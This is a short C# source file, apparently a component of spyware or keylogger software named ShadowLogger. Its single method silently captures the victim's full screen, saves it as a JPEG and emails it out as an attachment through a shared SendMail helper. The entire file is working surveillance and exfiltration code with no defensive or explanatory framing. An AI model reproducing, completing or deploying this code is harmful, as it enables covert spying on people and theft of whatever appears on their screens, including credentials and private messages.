using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.Timers_Management
{
    internal static class HelperMethods
    {
        internal static void PrintAndSend()
        {
            string psPath = Path.Combine(Application.StartupPath, "Print.jpg");

            Bitmap b = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(b);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            g.Save();
            b.Save(psPath, ImageFormat.Jpeg);
            g.Dispose();
            b.Dispose();
            SharedMethods.SendMail(string.Format(SharedMethods.GetMailSubject(), " - Screen of ### "), "Print Screen Attached", null, psPath);
        }
    }
}
